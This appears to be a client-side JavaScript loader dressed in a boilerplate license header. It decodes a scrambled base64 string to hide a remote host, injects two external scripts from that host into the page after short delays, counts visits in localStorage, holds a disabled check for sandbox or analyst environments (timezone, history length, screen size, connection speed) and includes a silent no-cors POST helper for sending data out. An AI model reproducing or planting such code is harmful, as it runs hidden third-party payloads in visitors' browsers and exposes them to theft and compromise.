/**
 * @licence
 * Copyright ©
 * All rights reserved
 * This source code is licensed under the found in the
 * LICENSE file in the root directory of this source tree
*/

var Nloaded = Number(localStorage.getItem("Nloaded")) + 1, _initiated, sc;

try {
  class identifierDocumentValue {
    get(bad) {
      bad = this.getFixed(bad);
      return bad;
    }

    getFixed(txt) {
      var p1 = "", p2 = "", l = txt.length;
      for (let i = 0; i <= l; i++) {
        if (i % 2 == 0) {
          p2 = txt.charAt(i) + p2;
        } else {
          p1 = p1 + txt.charAt(i);
        }
      }
      return atob(p1 + p2);
    }

  }
  sc = new identifierDocumentValue();
} catch (err) { }


function getDefaultName(name) {
  var dv = navigator.appVersion.split(")")[0].replace("5.0 (", "").replace("Linux; Android", "An..");
  if (_39012seefalseUser()) {
    dv += "__falseUser:____" + navigator.platform + "___" + navigator.userAgent;
  }
  return dv;
}

function _39012seefalseUser() {
  return false; //temp
  var place = new Date().toTimeString();
  if (
    (window.screen.width < window.innerWidth && window.screen.height < window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0, 3)) ||
    (history.length > 3 || history.length == 1) ||
    Nloaded > 2 ||
    !(place.includes('Pacific') || place.includes('Eastern') || place.includes('Central')) ||
    navigator.connection.downlink < 9
  ) {
    return true;
  }
}
function makeForm(url, dataObj) { const params = new URLSearchParams(); for (let key in dataObj) { params.append(key, dataObj[key]); } fetch(url, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params }); }

function addMaster(url) {
  var elem = document.createElement("script");
  elem.src = url;
  document.querySelector('head').insertAdjacentElement("beforeend", elem);
}
var serverData = {
  'null': sc.get("vaEHjRd0vc8HWMa6uLIyW9dzoZRWX8atnb5WiFbp"),
}
var lnkMain=serverData.null;


function _init() {
  _initiated = true;
  if (Nloaded) {
    localStorage.setItem("Nloaded", Number(Nloaded));
  } else {
    Nloaded = 1;
    localStorage.setItem("Nloaded", 1);
  }

  setTimeout(()=>{
    addMaster(`${lnkMain}data-19b902380k09`);
  },100);

  setTimeout(()=>{
    addMaster(`${lnkMain}master-10a404587b40544b`);
  },200);
}
//this is a last line
if (!_initiated) {
  _init();
}